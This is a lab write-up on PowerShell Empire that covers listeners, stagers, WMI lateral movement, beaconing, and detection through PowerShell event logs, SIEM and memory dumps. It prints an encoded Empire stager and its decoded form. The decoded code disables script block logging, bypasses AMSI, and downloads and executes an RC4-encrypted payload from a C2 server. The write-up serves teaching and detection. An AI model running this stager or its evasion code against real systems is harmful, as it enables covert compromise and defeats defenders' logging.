---
description: Exploring key concepts of the Powershell Empire
---

# Powershell Empire 101

### Listener

{% code title="attacker\@local" %}
```csharp
// Empire commands used
?
uselistener meterpreter
info
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLVfsQEjsPhoC9mrrXo%2F-LLVgU6_drYj3rPPxfcc%2Fempire-listener.png?alt=media\&token=a3c4ea7b-1721-4b49-a866-36f1888d48bf)

Starting the listener:

```
execute
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLVhcFs-4RhuczHSyAo%2F-LLVhltv_m2mpJ_F4nw9%2Fempire-startlistener.png?alt=media\&token=16a9747c-1e1d-480a-8b0f-590ad3ca5a4b)

### Stager

Stager will download and execute the final payload which will call back to the listener we set up previously - `meterpreter`- below shows how to set it up:

{% code title="attacker\@local" %}
```csharp
//specify what stager to use
usestager windows/hta

//associate stager with the meterpreter listener
set Listener meterpreter

//write stager to the file
set OutFile stage.hta

//create the stager
execute
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLVkfSX1oueat1I2G3u%2F-LLVl8NmSyTRUQ4eUlkO%2Fempire-stager.png?alt=media\&token=8bb44840-577a-43f8-9855-c74fedb5223c)

A quick look at the stager code:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLVlMb35obtvmGghj-c%2F-LLVm9UwsH607SWLon2x%2Fstager-hta.gif?alt=media\&token=91ce4a92-2766-4c5b-9322-8d4de7c8dff6)

#### Issues

Various stagers I generated for the meterpreter listener were giving me errors like [this](https://github.com/EmpireProject/Empire/issues/896) and this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLW9uNdvu7KCxPViA5s%2F-LLWHlPKLHTfd2OkbyV7%2Fstager-bat.png?alt=media\&token=880bd6ad-9782-4137-ba75-39c066ec1f67)

and this:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLW9uNdvu7KCxPViA5s%2F-LLWHnMIXWcom9O0xePx%2Fstager-vbs.png?alt=media\&token=3370f995-f17a-410e-b0c6-c8db19c21ee0)

After looking at the traffic and a quick nmap scan, it seemed like there may be a bug in Empire's uselistener module when used with meterpreter - for some reason it will not actually start listening/open up the port:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLW9uNdvu7KCxPViA5s%2F-LLWJyS_SxlV3jwJmojz%2Fstager-listeners.png?alt=media\&token=5dcd49f0-9009-4ed9-8a4f-19341dc75c95)

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLW9uNdvu7KCxPViA5s%2F-LLWK0CF_1TeTS-_kBr_%2Fstager-pcap.png?alt=media\&token=4064f95d-8454-4f7e-b058-8cf2da463b9b)

To test this assumption, I created another http listener on port 80 - which worked immediately, leaving the meterpeter listener being buggy at least in my environment:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLW9uNdvu7KCxPViA5s%2F-LLWKy8HeE5zbjesIzt0%2Fstager-http.png?alt=media\&token=41bab2a0-d439-4955-8a71-b5640442df73)

### Agent

Agent is essentially a compromised victim system that called back to the listener and is now ready to receive commands.

Continuing testing with the `http` listener and a `multi/launcher` stager, the agent is finally returned once the `launcher.ps1` (read: stager) is executed on the victim system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLW9uNdvu7KCxPViA5s%2F-LLWOkP33b87xf3C6hJ3%2Fstager-received.gif?alt=media\&token=6880e203-ec56-4b0a-917b-37caa138f0f4)

Let's try getting one more agent back from another machine via [WMI lateral movement](https://www.ired.team/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement):

{% code title="attacker\@local" %}
```csharp
interact <agent-name>
usemodule powershell/lateral_movement/invoke_wmi
set Agent <agent-name>
set UserName offense\administrator
set Password 123456
set ComputerName dc-mantvydas
run
```
{% endcode %}

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLaBYv3P8aJw3l0BjUh%2F-LLaC4hMYRBCHBCaUYWV%2Fempire-lateral-wmi.gif?alt=media\&token=b885f109-bac4-4517-a6ed-8e9e28533d7b)

### Beaconing

With default http listener profile set, below are the most commonly used URLs of the agent beaconing back to the listener:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLWS2T-vWoqNhtjJNsc%2F-LLWSEd5ACT-o02P8anr%2Fagent-beaconing.png?alt=media\&token=b0640bd4-ce9b-47be-9023-446289f5b949)

The packet data in any of those beacons:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLWS2T-vWoqNhtjJNsc%2F-LLWSz1Ba4UDElmG9waG%2Fagent-beacon-request-response.png?alt=media\&token=ecd25cc6-4d11-4fbb-a248-0e30ad974526)

### Observations

Note how executing the stager launcher.ps1 spawned another powershell instance and both parent and the child windows are hidden. Note that the children powershell was invoked with an encoded powershell command line:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LLWVGLR6IzjwmsOuIOz%2F-LLWVJw-BVx-16T0GY6V%2Fagent-procmon.png?alt=media\&token=168b5755-02de-4ac7-b06c-3d3cb20b4ef9)

Stager's command line in base64:

```csharp
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBlAFIAcwBpAE8AbgBUAGEAYgBMAGUALgBQAFMAVgBFAHIAUwBpAE8ATgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAARgA9AFsAUgBlAEYAXQAuAEEAcwBzAEUAbQBCAGwAeQAuAEcAZQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAVABGAGkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBmACgAJABHAFAARgApAHsAJABHAFAAQwA9ACQARwBQAEYALgBHAGUAdABWAGEATAB1AGUAKAAkAE4AdQBsAEwAKQA7AEkARgAoACQARwBQAEMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQApAHsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABHAFAAQwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQA9ADAAfQAkAHYAQQBMAD0AWwBDAG8AbABMAEUAYwB0AEkATwBuAHMALgBHAGUATgBlAFIAaQBDAC4ARABJAGMAdABpAG8ATgBhAFIAeQBbAHMAVABSAEkAbgBHACwAUwB5AHMAdABFAG0ALgBPAGIAagBFAGMAdABdAF0AOgA6AG4ARQB3ACgAKQA7ACQAdgBhAGwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQAVgBhAEwALgBBAEQAZAAoACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnACwAMAApADsAJABHAFAAQwBbACcASABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAG8AZgB0AHcAYQByAGUAXABQAG8AbABpAGMAaQBlAHMAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AJABWAGEAbAB9AEUATABTAEUAewBbAFMAYwByAEkAcAB0AEIATABPAEMAawBdAC4AIgBHAGUAVABGAGkARQBgAGwARAAiACgAJwBzAGkAZwBuAGEAdAB1AHIAZQBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAFQAVgBhAEwAVQBlACgAJABuAFUATABMACwAKABOAGUAdwAtAE8AQgBqAEUAQwB0ACAAQwBvAEwAbABFAEMAVABJAG8AbgBTAC4ARwBFAE4AZQByAEkAQwAuAEgAYQBzAEgAUwBlAFQAWwBzAHQAcgBJAE4AZwBdACkAKQB9AFsAUgBFAEYAXQAuAEEAUwBTAEUATQBiAGwAWQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpAFUAdABpAGwAcwAnACkAfAA/AHsAJABfAH0AfAAlAHsAJABfAC4ARwBFAFQARgBpAGUAbABkACgAJwBhAG0AcwBpAEkAbgBpAHQARgBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATABVAGUAKAAkAG4AVQBMAGwALAAkAHQAcgBVAGUAKQB9ADsAfQA7AFsAUwB5AFMAdABFAG0ALgBOAGUAdAAuAFMARQBSAFYAaQBjAGUAUABPAGkATgB0AE0AQQBOAEEARwBFAHIAXQA6ADoARQBYAHAAZQBDAHQAMQAwADAAQwBvAE4AdABJAE4AVQBlAD0AMAA7ACQAdwBjAD0ATgBFAFcALQBPAEIASgBlAEMAVAAgAFMAeQBTAFQAZQBNAC4ATgBlAHQALgBXAGUAYgBDAEwASQBFAE4AVAA7ACQAdQA9ACcATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVAByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAwACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAHcAYwAuAEgAZQBBAGQAZQByAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkAHcAYwAuAFAAUgBPAFgAeQA9AFsAUwBZAFMAdABFAG0ALgBOAEUAdAAuAFcARQBiAFIARQBRAFUAZQBTAFQAXQA6ADoARABFAGYAQQB1AEwAVABXAEUAYgBQAFIAbwB4AHkAOwAkAFcAQwAuAFAAUgBvAFgAWQAuAEMAcgBFAEQAZQBuAFQAaQBhAEwAUwAgAD0AIABbAFMAWQBzAHQAZQBNAC4ATgBFAFQALgBDAHIARQBkAEUATgBUAEkAQQBsAEMAYQBDAEgARQBdADoAOgBEAEUAZgBhAHUAbAB0AE4AZQBUAHcATwBSAGsAQwBSAGUAZABFAG4AVABpAGEATABzADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkAHcAYwAuAFAAcgBvAHgAeQA7ACQASwA9AFsAUwB5AHMAdABFAE0ALgBUAEUAeABUAC4ARQBuAEMATwBEAEkATgBnAF0AOgA6AEEAUwBDAEkASQAuAEcAZQBUAEIAeQB0AGUAcwAoACcAUgAuACUAPwBWAHQAQwA4AHgAcQBnAG4AcwBGAGMANQBaACsAOgA5AHcAZABFAH0AQQBCAE0AcAB7AG0AegBPACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAFIARwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBPAFUATgB0AF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAHIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAcwBlAHIAPQAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgA3ADEAOgA4ADAAJwA7ACQAdAA9ACcALwBsAG8AZwBpAG4ALwBwAHIAbwBjAGUAcwBzAC4AcABoAHAAJwA7ACQAVwBjAC4ASABFAEEAZABlAHIAUwAuAEEAZABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0AOQB1AGwAYQB0AEwASwBMAHgANQBEAFcAWgA1AEkAYQB3AFIAdQBzAEYAUwAyAFoAMgByAEEAPQAiACkAOwAkAGQAQQB0AGEAPQAkAFcAQwAuAEQAbwBXAE4AbABvAEEAZABEAGEAdABBACgAJABTAEUAUgArACQAdAApADsAJABJAHYAPQAkAEQAQQBUAGEAWwAwAC4ALgAzAF0AOwAkAEQAYQBUAEEAPQAkAEQAYQB0AEEAWwA0AC4ALgAkAEQAYQB0AEEALgBMAGUATgBnAFQASABdADsALQBqAE8AaQBOAFsAQwBoAGEAUgBbAF0AXQAoACYAIAAkAFIAIAAkAGQAYQB0AEEAIAAoACQASQBWACsAJABLACkAKQB8AEkARQBYAA==
```

Decoded command line with notable user agent, C2 server and a session cookie:

```csharp
If($PSVeRsiOnTabLe.PSVErSiON.MAJOR - ge 3) {
    $GPF = [ReF].AssEmBly.GeTTyPE('System.Management.Automation.Utils').
    "GETFiE`ld" ('cachedGroupPolicySettings', 'N' + 'onPublic,Static');
    If($GPF) {
        $GPC = $GPF.GetVaLue($NulL);
        IF($GPC['ScriptB' + 'lockLogging']) {
            $GPC['ScriptB' + 'lockLogging']['EnableScriptB' + 'lockLogging'] = 0;
            $GPC['ScriptB' + 'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $vAL = [ColLEctIOns.GeNeRiC.DIctioNaRy[sTRInG, SystEm.ObjEct]]::nEw();
        $val.ADd('EnableScriptB' + 'lockLogging', 0);
        $VaL.ADd('EnableScriptBlockInvocationLogging', 0);
        $GPC['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB' + 'lockLogging'] = $Val
    }
    ELSE {
        [ScrIptBLOCk].
        "GeTFiE`lD" ('signatures', 'N' + 'onPublic,Static').SeTVaLUe($nULL, (New - OBjECt CoLlECTIonS.GENerIC.HasHSeT[strINg]))
    }[REF].ASSEMblY.GETTYpe('System.Management.Automation.AmsiUtils') | ? {
        $_
    } | % {
        $_.GETField('amsiInitFailed', 'NonPublic,Static').SETVALUe($nULl, $trUe)
    };
};
[SyStEm.Net.SERVicePOiNtMANAGEr]::EXpeCt100CoNtINUe = 0;
$wc = NEW - OBJeCT SySTeM.Net.WebCLIENT;
$u = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';
$wc.HeAderS.Add('User-Agent', $u);
$wc.PROXy = [SYStEm.NEt.WEbREQUeST]::DEfAuLTWEbPRoxy;
$WC.PRoXY.CrEDenTiaLS = [SYsteM.NET.CrEdENTIAlCaCHE]::DEfaultNeTwORkCRedEnTiaLs;
$Script: Proxy = $wc.Proxy;
$K = [SystEM.TExT.EnCODINg]::ASCII.GeTBytes('R.%?VtC8xqgnsFc5Z+:9wdE}ABMp{mzO');
$R = {
    $D,
    $K = $ARGS;$S = 0. .255;0. .255 | % {
        $J = ($J + $S[$_] + $K[$_ % $K.COUNt]) % 256;$S[$_],
        $S[$J] = $S[$J],
        $S[$_]
    };$D | % {
        $I = ($I + 1) % 256;$H = ($H + $S[$I]) % 256;$S[$I],
        $S[$H] = $S[$H],
        $S[$I];$_ - bxor$S[($S[$I] + $S[$H]) % 256]
    }
};
$ser = 'http://192.168.2.71:80';
$t = '/login/process.php';
$Wc.HEAderS.AdD("Cookie", "session=9ulatLKLx5DWZ5IawRusFS2Z2rA=");
$dAta = $WC.DoWNloAdDatA($SER + $t);
$Iv = $DATa[0. .3];
$DaTA = $DatA[4..$DatA.LeNgTH]; - jOiN[ChaR[]]( & $R $datA($IV + $K)) | IEX
```

#### Logs

If we isolate the evil powershell that was infected by the Empire in our SIEM, we can see the beacons:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LL_l_8NydTcSu1Gftie%2F-LL_lPhF9dYHUjF9wbBd%2Fagent-beacons-logs.png?alt=media\&token=85d02661-1caf-40cb-9a0d-cedd6e775722)

A compromised system can generate event `800` showing the following in Windows PowerShell logs (powershell 5.0+):

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LL_n4rkh2hKnhCuFw4Y%2F-LL_nmrsVCuTjbKjQlez%2Fempire-800.png?alt=media\&token=85cf9214-f218-44d2-97d4-f0dc50d1a727)

Also loads of `4103` events in `Microsoft-Windows-PowerShell/Operational`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LL_oSqu6eLJLBLBTjnp%2F-LL_okcMqJESPCiJtjAg%2Fempire-4103.png?alt=media\&token=4ebabc5a-da54-482d-8be7-fb010347967d)

In the same way, if PS transcript logging is enabled, the stager execution could be captured in there:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LL_oSqu6eLJLBLBTjnp%2F-LL_rV1b6fjvidda4fei%2Fempire-transcript.png?alt=media\&token=f8d7f6b2-0c7c-4666-bf25-5702c78fc2bc)

#### Memory Dumps

A memory dump can also reveal the same stager activity:

```csharp
volatility -f /mnt/memdumps/w7-empire.bin consoles --profile Win7SP1x64
```

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LL_zM_hDGi9i-ilx5d0%2F-LLa-5TX2paTh_ug6jl_%2Fempire-volatility.png?alt=media\&token=7af9d091-5126-46cb-90b4-263cbcf3136a)

### References

{% embed url="https://www.sans.org/reading-room/whitepapers/incident/disrupting-empire-identifying-powershell-empire-command-control-activity-38315" %}

{% embed url="https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/" %}
